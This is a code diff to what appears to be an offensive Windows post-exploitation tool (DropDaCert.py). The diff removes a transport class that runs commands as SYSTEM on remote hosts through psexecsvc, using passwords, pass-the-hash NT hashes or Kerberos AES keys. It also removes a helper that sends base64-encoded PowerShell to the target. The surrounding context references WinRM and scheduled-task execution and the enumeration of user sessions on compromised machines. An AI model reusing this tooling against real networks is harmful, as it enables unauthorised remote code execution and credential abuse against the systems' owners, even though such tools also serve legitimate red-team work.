@@ -726,93 +726,6 @@ def connect_winrm(hostname, ip, username, password, nt_hash, domain,
 
 # ── Susinternals transport ───────────────────────────────────────────────────
 
-class SusinternalsExec:
-    def __init__(self, target_ip, username, password, nt_hash, domain,
-                 dc_ip, aes_key, use_krb):
-        self.target_ip = target_ip
-        self.username  = username
-        self.password  = password
-        self.nt_hash   = nt_hash
-        self.domain    = domain
-        self.dc_ip     = dc_ip
-        self.aes_key   = aes_key
-        self.use_krb   = use_krb
-        self._script   = self._find_psexecsvc()
-
-    def _find_psexecsvc(self):
-        candidates = [
-            os.path.join(os.path.dirname(os.path.abspath(__file__)), "psexecsvc.py"),
-            shutil.which("psexecsvc.py") or "",
-        ]
-        for p in candidates:
-            if p and os.path.isfile(p):
-                return p
-        die("psexecsvc.py not found — download from github.com/sensepost/susinternals "
-            "and place alongside DropDaCert.py")
-
-    def _build_target_str(self):
-        if self.domain:
-            t = f"{self.domain}/{self.username}"
-        else:
-            t = self.username
-        if self.password:
-            t += f":{self.password}"
-        t += f"@{self.target_ip}"
-        return t
-
-    @staticmethod
-    def _filter_output(text):
-        # strip control chars (backspace, etc.) injected by psexecsvc pipe handling
-        text = re.sub(r'[\x00-\x09\x0b\x0c\x0e-\x1f]', '', text)
-        text = text.replace('\r', '')
-        lines = text.splitlines(True)
-        filtered = []
-        for line in lines:
-            s = line.strip()
-            if (s.startswith("Impacket ") or s.startswith("Copyright ") or
-                s.startswith("[*]") or s.startswith("[+]") or
-                s.startswith("[!]") or s.startswith("[-]") or
-                s.startswith("Exception in thread") or
-                s.startswith("Traceback ") or s.startswith("File ") or
-                s.startswith("impacket.") or s.startswith("During handling") or
-                s == ""):
-                continue
-            filtered.append(line)
-        return "".join(filtered)
-
-    def run_cmd(self, cmd):
-        args = [sys.executable, self._script, self._build_target_str(),
-                "-system", "-command", "cmd.exe", "-arguments", f"/c {cmd}"]
-        if self.nt_hash:
-            h = self.nt_hash
-            if ":" not in h:
-                h = f"aad3b435b51404eeaad3b435b51404ee:{h}"
-            args.extend(["-hashes", h])
-        if self.use_krb:
-            args.append("-k")
-        if self.dc_ip:
-            args.extend(["-dc-ip", self.dc_ip])
-        if self.aes_key:
-            args.extend(["-aes-key", self.aes_key])
-        try:
-            r = subprocess.run(args, stdin=subprocess.DEVNULL,
-                               capture_output=True, text=True, timeout=300)
-            out = self._filter_output(r.stdout)
-            rc = r.returncode
-            # psexecsvc pipe disconnect after cmd /c exits is expected
-            if rc != 0 and "STATUS_PIPE_DISCONNECTED" in r.stderr:
-                rc = 0
-            return out, r.stderr, rc
-        except subprocess.TimeoutExpired:
-            return "", "susinternals: command timed out", 1
-
-    def run_ps(self, ps_code):
-        enc = base64.b64encode(ps_code.encode("utf-16-le")).decode()
-        return self.run_cmd(f"powershell -NonInteractive -EncodedCommand {enc}")
-
-    def close(self):
-        pass
-
 
 # ── SMB file transfer ────────────────────────────────────────────────────────
 
@@ -1384,7 +1297,6 @@ def main():
     info(f"Target: {hostname} ({ip})")
 
     # ── Connect transport
-    use_susinternals = (args.exec_method == "smb")
     use_tsch = (args.exec_method == "tsch")
 
     transport = None
@@ -1394,17 +1306,6 @@ def main():
     if use_tsch:
         info("Connecting via SMB...")
         ad_domain = args.domain if "." in (args.domain or "") else None
-    elif use_susinternals:
-        info("Connecting via SMB (PSExeSVC)...")
-        transport = SusinternalsExec(
-            ip, args.username, args.password, args.nt_hash,
-            args.domain, args.dc_ip, args.aes_key, args.kerberos)
-        out, err, rc = _run(transport,
-            'powershell -NonInteractive -Command "(Get-WmiObject Win32_ComputerSystem).Domain"')
-        if rc != 0 and not out.strip():
-            die(f"PSExeSVC connection failed: {err.strip()[:200]}")
-        info("Connected")
-        ad_domain = out.strip() if out.strip() and "." in out.strip() else None
     else:
         auth_type = "Kerberos" if args.kerberos else "NTLM"
         info(f"Connecting via WinRM ({auth_type})...")
@@ -1441,8 +1342,6 @@ def main():
         except Exception as e:
             die(f"Session enumeration failed: {e}")
     else:
-        if use_susinternals:
-            info("Enumerating sessions...")
         sessions = enum_sessions(transport)
     if not sessions:
         die("No active user sessions found.")
@@ -1612,8 +1511,8 @@ def parse_args():
 
     exc = p.add_argument_group("execution")
     exc.add_argument("--exec-method", default="tsch",
-        choices=["tsch", "winrm", "smb", "manual"],
-        help="Command execution method: tsch (default, RPC via port 445), winrm, smb (psexecsvc), or manual (generate files only)")
+        choices=["tsch", "winrm", "manual"],
+        help="Command execution method: tsch (default, RPC via port 445), winrm, or manual (generate files only)")
     exc.add_argument("--exec-wrapper", default="conhost",
         choices=list(EXEC_METHODS),
         help="Bat execution wrapper: conhost|cmd|powershell|wscript (default: conhost)")
